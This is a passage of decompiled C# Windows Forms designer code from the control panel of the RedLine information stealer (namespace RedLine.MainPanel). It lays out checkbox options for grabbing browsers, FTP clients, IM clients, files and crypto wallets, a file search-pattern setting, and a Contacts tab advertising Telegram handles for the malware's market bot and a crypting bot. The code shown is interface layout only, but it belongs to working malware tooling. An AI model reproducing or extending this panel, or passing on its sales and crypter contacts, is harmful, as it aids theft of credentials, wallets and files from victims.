		((System.Windows.Forms.Control)this.c8).Location = new System.Drawing.Point(49, 267);
		((System.Windows.Forms.Control)this.c8).Name = "grabColdWalletLbl";
		((System.Windows.Forms.Control)this.c8).Size = new System.Drawing.Size(124, 30);
		((System.Windows.Forms.Control)this.c8).TabIndex = 106;
		((System.Windows.Forms.Control)this.c8).Text = "Get Wallets:";
		((System.Windows.Forms.Label)this.c8).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.c9).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.c9).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.c9).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.c9).Checked = true;
		((MetroSetCheckBox)this.c9).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.c9).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.c9).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.c9).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.c9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c9).Location = new System.Drawing.Point(229, 277);
		((System.Windows.Forms.Control)this.c9).Name = "grabColdWalletCb";
		((MetroSetCheckBox)this.c9).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.c9).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.c9).Style = (Style)1;
		((MetroSetCheckBox)this.c9).StyleManager = null;
		((System.Windows.Forms.Control)this.c9).TabIndex = 105;
		((MetroSetCheckBox)this.c9).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.c9).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.duplicateLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.duplicateLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.duplicateLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.duplicateLbl).Location = new System.Drawing.Point(49, 225);
		((System.Windows.Forms.Control)this.duplicateLbl).Name = "duplicateLbl";
		((System.Windows.Forms.Control)this.duplicateLbl).Size = new System.Drawing.Size(150, 30);
		((System.Windows.Forms.Control)this.duplicateLbl).TabIndex = 104;
		((System.Windows.Forms.Control)this.duplicateLbl).Text = "Anti Duplicate:";
		((System.Windows.Forms.Label)this.duplicateLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.duplicateCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.duplicateCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.duplicateCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.duplicateCb).Checked = true;
		((MetroSetCheckBox)this.duplicateCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.duplicateCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.duplicateCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.duplicateCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.duplicateCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.duplicateCb).Location = new System.Drawing.Point(229, 235);
		((System.Windows.Forms.Control)this.duplicateCb).Name = "duplicateCb";
		((MetroSetCheckBox)this.duplicateCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.duplicateCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.duplicateCb).Style = (Style)1;
		((MetroSetCheckBox)this.duplicateCb).StyleManager = null;
		((System.Windows.Forms.Control)this.duplicateCb).TabIndex = 103;
		((MetroSetCheckBox)this.duplicateCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.duplicateCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.metroSetDivider10).Location = new System.Drawing.Point(0, 598);
		((System.Windows.Forms.Control)this.metroSetDivider10).Name = "metroSetDivider10";
		((MetroSetDivider)this.metroSetDivider10).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider10).Size = new System.Drawing.Size(1273, 4);
		((MetroSetDivider)this.metroSetDivider10).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider10).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider10).TabIndex = 102;
		((System.Windows.Forms.Control)this.metroSetDivider10).Text = "metroSetDivider10";
		((MetroSetDivider)this.metroSetDivider10).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider10).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider10).Thickness = 1;
		((MetroSetButton)this.saveSettingsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveSettingsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveSettingsBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.saveSettingsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.saveSettingsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveSettingsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveSettingsBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveSettingsBtn).Location = new System.Drawing.Point(515, 608);
		((System.Windows.Forms.Control)this.saveSettingsBtn).Name = "saveSettingsBtn";
		((MetroSetButton)this.saveSettingsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveSettingsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveSettingsBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.saveSettingsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveSettingsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveSettingsBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveSettingsBtn).Size = new System.Drawing.Size(133, 23);
		((MetroSetButton)this.saveSettingsBtn).Style = (Style)0;
		((MetroSetButton)this.saveSettingsBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.saveSettingsBtn).TabIndex = 101;
		((System.Windows.Forms.Control)this.saveSettingsBtn).Text = "Save settings";
		((MetroSetButton)this.saveSettingsBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.saveSettingsBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.saveSettingsBtn).Click += new System.EventHandler(saveSettingsBtn_Click);
		((MetroSetButton)this.addSearchPatternBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addSearchPatternBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.addSearchPatternBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.addSearchPatternBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addSearchPatternBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.addSearchPatternBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Location = new System.Drawing.Point(1057, 296);
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Name = "addSearchPatternBtn";
		((MetroSetButton)this.addSearchPatternBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addSearchPatternBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.addSearchPatternBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.addSearchPatternBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addSearchPatternBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.addSearchPatternBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.addSearchPatternBtn).Style = (Style)0;
		((MetroSetButton)this.addSearchPatternBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.addSearchPatternBtn).TabIndex = 97;
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Text = "Add";
		((MetroSetButton)this.addSearchPatternBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.addSearchPatternBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.addSearchPatternBtn).Click += new System.EventHandler(addSearchPatternBtn_Click);
		((AnimaTextBox)this.searchPatternTb).Dark = false;
		((System.Windows.Forms.Control)this.searchPatternTb).Location = new System.Drawing.Point(545, 296);
		((AnimaTextBox)this.searchPatternTb).MaxLength = 32767;
		((AnimaTextBox)this.searchPatternTb).MultiLine = false;
		((System.Windows.Forms.Control)this.searchPatternTb).Name = "searchPatternTb";
		((AnimaTextBox)this.searchPatternTb).Numeric = false;
		((AnimaTextBox)this.searchPatternTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.searchPatternTb).Size = new System.Drawing.Size(506, 23);
		((System.Windows.Forms.Control)this.searchPatternTb).TabIndex = 96;
		((AnimaTextBox)this.searchPatternTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.searchPatternLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.searchPatternLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.searchPatternLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.searchPatternLbl).Location = new System.Drawing.Point(542, 278);
		((System.Windows.Forms.Control)this.searchPatternLbl).Name = "searchPatternLbl";
		((System.Windows.Forms.Control)this.searchPatternLbl).Size = new System.Drawing.Size(124, 15);
		((System.Windows.Forms.Control)this.searchPatternLbl).TabIndex = 95;
		((System.Windows.Forms.Control)this.searchPatternLbl).Text = "Enter a search pattern:";
		((System.Windows.Forms.Control)this.getFilesSettingsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.getFilesSettingsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		((System.Windows.Forms.Control)this.getFilesSettingsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_3;
		((System.Windows.Forms.Control)this.getFilesSettingsLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.getFilesSettingsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.getFilesSettingsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.getFilesSettingsLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.getFilesSettingsLb).ItemHeight = 18;
		((System.Windows.Forms.Control)this.getFilesSettingsLb).Location = new System.Drawing.Point(545, 40);
		((System.Windows.Forms.Control)this.getFilesSettingsLb).Name = "getFilesSettingsLb";
		((System.Windows.Forms.Control)this.getFilesSettingsLb).Size = new System.Drawing.Size(587, 218);
		((System.Windows.Forms.Control)this.getFilesSettingsLb).TabIndex = 92;
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).Location = new System.Drawing.Point(673, 7);
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).Name = "getFilesSettingsLbl";
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).Size = new System.Drawing.Size(171, 30);
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).TabIndex = 91;
		((System.Windows.Forms.Control)this.getFilesSettingsLbl).Text = "Get files settings:";
		((System.Windows.Forms.Label)this.getFilesSettingsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.grabFilesLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.grabFilesLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabFilesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.grabFilesLbl).Location = new System.Drawing.Point(49, 139);
		((System.Windows.Forms.Control)this.grabFilesLbl).Name = "grabFilesLbl";
		((System.Windows.Forms.Control)this.grabFilesLbl).Size = new System.Drawing.Size(96, 30);
		((System.Windows.Forms.Control)this.grabFilesLbl).TabIndex = 90;
		((System.Windows.Forms.Control)this.grabFilesLbl).Text = "Get Files:";
		((System.Windows.Forms.Label)this.grabFilesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.grabFilesCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.grabFilesCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.grabFilesCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.grabFilesCb).Checked = true;
		((MetroSetCheckBox)this.grabFilesCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.grabFilesCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.grabFilesCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.grabFilesCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.grabFilesCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabFilesCb).Location = new System.Drawing.Point(229, 149);
		((System.Windows.Forms.Control)this.grabFilesCb).Name = "grabFilesCb";
		((MetroSetCheckBox)this.grabFilesCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.grabFilesCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.grabFilesCb).Style = (Style)1;
		((MetroSetCheckBox)this.grabFilesCb).StyleManager = null;
		((System.Windows.Forms.Control)this.grabFilesCb).TabIndex = 89;
		((MetroSetCheckBox)this.grabFilesCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.grabFilesCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.grabImClientsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.grabImClientsLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabImClientsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.grabImClientsLbl).Location = new System.Drawing.Point(49, 99);
		((System.Windows.Forms.Control)this.grabImClientsLbl).Name = "grabImClientsLbl";
		((System.Windows.Forms.Control)this.grabImClientsLbl).Size = new System.Drawing.Size(146, 30);
		((System.Windows.Forms.Control)this.grabImClientsLbl).TabIndex = 88;
		((System.Windows.Forms.Control)this.grabImClientsLbl).Text = "Get IM clients:";
		((System.Windows.Forms.Label)this.grabImClientsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.grabImClientsCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.grabImClientsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.grabImClientsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.grabImClientsCb).Checked = true;
		((MetroSetCheckBox)this.grabImClientsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.grabImClientsCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.grabImClientsCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.grabImClientsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.grabImClientsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabImClientsCb).Location = new System.Drawing.Point(229, 109);
		((System.Windows.Forms.Control)this.grabImClientsCb).Name = "grabImClientsCb";
		((MetroSetCheckBox)this.grabImClientsCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.grabImClientsCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.grabImClientsCb).Style = (Style)1;
		((MetroSetCheckBox)this.grabImClientsCb).StyleManager = null;
		((System.Windows.Forms.Control)this.grabImClientsCb).TabIndex = 87;
		((MetroSetCheckBox)this.grabImClientsCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.grabImClientsCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.grabFtpsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.grabFtpsLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabFtpsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.grabFtpsLbl).Location = new System.Drawing.Point(49, 59);
		((System.Windows.Forms.Control)this.grabFtpsLbl).Name = "grabFtpsLbl";
		((System.Windows.Forms.Control)this.grabFtpsLbl).Size = new System.Drawing.Size(147, 30);
		((System.Windows.Forms.Control)this.grabFtpsLbl).TabIndex = 86;
		((System.Windows.Forms.Control)this.grabFtpsLbl).Text = "Get ftp clients:";
		((System.Windows.Forms.Label)this.grabFtpsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.grabFtpsCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.grabFtpsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.grabFtpsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.grabFtpsCb).Checked = true;
		((MetroSetCheckBox)this.grabFtpsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.grabFtpsCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.grabFtpsCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.grabFtpsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.grabFtpsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabFtpsCb).Location = new System.Drawing.Point(229, 69);
		((System.Windows.Forms.Control)this.grabFtpsCb).Name = "grabFtpsCb";
		((MetroSetCheckBox)this.grabFtpsCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.grabFtpsCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.grabFtpsCb).Style = (Style)1;
		((MetroSetCheckBox)this.grabFtpsCb).StyleManager = null;
		((System.Windows.Forms.Control)this.grabFtpsCb).TabIndex = 85;
		((MetroSetCheckBox)this.grabFtpsCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.grabFtpsCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.grabBrowsersLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.grabBrowsersLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabBrowsersLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.grabBrowsersLbl).Location = new System.Drawing.Point(49, 19);
		((System.Windows.Forms.Control)this.grabBrowsersLbl).Name = "grabBrowsersLbl";
		((System.Windows.Forms.Control)this.grabBrowsersLbl).Size = new System.Drawing.Size(138, 30);
		((System.Windows.Forms.Control)this.grabBrowsersLbl).TabIndex = 84;
		((System.Windows.Forms.Control)this.grabBrowsersLbl).Text = "Get browsers:";
		((System.Windows.Forms.Label)this.grabBrowsersLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.grabBrowsersCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.grabBrowsersCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.grabBrowsersCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.grabBrowsersCb).Checked = true;
		((MetroSetCheckBox)this.grabBrowsersCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.grabBrowsersCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.grabBrowsersCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.grabBrowsersCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.grabBrowsersCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.grabBrowsersCb).Location = new System.Drawing.Point(229, 29);
		((System.Windows.Forms.Control)this.grabBrowsersCb).Name = "grabBrowsersCb";
		((MetroSetCheckBox)this.grabBrowsersCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.grabBrowsersCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.grabBrowsersCb).Style = (Style)1;
		((MetroSetCheckBox)this.grabBrowsersCb).StyleManager = null;
		((System.Windows.Forms.Control)this.grabBrowsersCb).TabIndex = 83;
		((MetroSetCheckBox)this.grabBrowsersCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.grabBrowsersCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.contactsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.e4);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.e5);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.e6);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.label2);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.pictureBox1);
		((System.Windows.Forms.Control)this.contactsTab).Controls.Add((System.Windows.Forms.Control)this.telegramLinkBtn);
		((System.Windows.Forms.Control)this.contactsTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.contactsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.contactsTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.contactsTab).Name = "contactsTab";
		((System.Windows.Forms.Control)this.contactsTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.contactsTab).TabIndex = 9;
		((System.Windows.Forms.Control)this.contactsTab).Text = "Contacts";
		((System.Windows.Forms.Control)this.e4).AutoSize = true;
		((System.Windows.Forms.Control)this.e4).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.e4).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.e4).Location = new System.Drawing.Point(367, 397);
		((System.Windows.Forms.Control)this.e4).Name = "label25";
		((System.Windows.Forms.Control)this.e4).Size = new System.Drawing.Size(297, 21);
		((System.Windows.Forms.Control)this.e4).TabIndex = 37;
		((System.Windows.Forms.Control)this.e4).Text = "Crypt BOT Telegram: @spectrcrypt_bot";
		((System.Windows.Forms.PictureBox)this.e5).Image = RedLine.MainPanel.Properties.Resources.telegram;
		((System.Windows.Forms.Control)this.e5).Location = new System.Drawing.Point(494, 316);
		((System.Windows.Forms.Control)this.e5).Name = "pictureBox2";
		((System.Windows.Forms.Control)this.e5).Size = new System.Drawing.Size(70, 70);
		((System.Windows.Forms.PictureBox)this.e5).SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		((System.Windows.Forms.PictureBox)this.e5).TabIndex = 36;
		((System.Windows.Forms.PictureBox)this.e5).TabStop = false;
		((MetroSetButton)this.e6).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.e6).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.e6).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.e6).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.e6).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.e6).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.e6).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.e6).Location = new System.Drawing.Point(494, 430);
		((System.Windows.Forms.Control)this.e6).Name = "metroSetButton1";
		((MetroSetButton)this.e6).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.e6).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.e6).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.e6).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.e6).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.e6).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.e6).Size = new System.Drawing.Size(70, 23);
		((MetroSetButton)this.e6).Style = (Style)0;
		((MetroSetButton)this.e6).StyleManager = null;
		((System.Windows.Forms.Control)this.e6).TabIndex = 35;
		((System.Windows.Forms.Control)this.e6).Text = "Open";
		((MetroSetButton)this.e6).ThemeAuthor = "Narwin";
		((MetroSetButton)this.e6).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.e6).Click += new System.EventHandler(e6_Click);
		((System.Windows.Forms.Control)this.label2).AutoSize = true;
		((System.Windows.Forms.Control)this.label2).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label2).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label2).Location = new System.Drawing.Point(412, 233);
		((System.Windows.Forms.Control)this.label2).Name = "label2";
		((System.Windows.Forms.Control)this.label2).Size = new System.Drawing.Size(242, 21);
		((System.Windows.Forms.Control)this.label2).TabIndex = 34;
		((System.Windows.Forms.Control)this.label2).Text = "Telegram: @redline_market_bot";
		((System.Windows.Forms.PictureBox)this.pictureBox1).Image = RedLine.MainPanel.Properties.Resources.telegram;
		((System.Windows.Forms.Control)this.pictureBox1).Location = new System.Drawing.Point(494, 152);
		((System.Windows.Forms.Control)this.pictureBox1).Name = "pictureBox1";
		((System.Windows.Forms.Control)this.pictureBox1).Size = new System.Drawing.Size(70, 70);
		((System.Windows.Forms.PictureBox)this.pictureBox1).SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		((System.Windows.Forms.PictureBox)this.pictureBox1).TabIndex = 33;
		((System.Windows.Forms.PictureBox)this.pictureBox1).TabStop = false;
		((MetroSetButton)this.telegramLinkBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.telegramLinkBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.telegramLinkBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.telegramLinkBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.telegramLinkBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
